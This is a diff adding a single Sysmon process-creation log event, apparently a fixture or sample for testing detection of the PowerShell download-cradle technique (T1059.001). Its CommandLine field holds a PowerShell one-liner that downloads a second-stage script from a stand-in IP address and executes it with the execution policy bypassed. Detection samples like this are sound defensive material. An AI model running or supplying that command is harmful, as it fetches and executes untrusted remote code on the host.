@@ -1,0 +1,16 @@
+{
+  "EventID": 1,
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "UtcTime": "2026-10-21T01:10:00.000Z",
+  "Computer": "WIN10-CLIENT01.corp.local",
+  "EventData": {
+    "RuleName": "technique_id=T1059.001,technique_name=PowerShell Download Cradle",
+    "ProcessId": 6430,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')\"",
+    "CurrentDirectory": "C:\\Users\\targetuser\\",
+    "User": "CORP\\targetuser",
+    "ParentProcessId": 2104,
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  }
+}
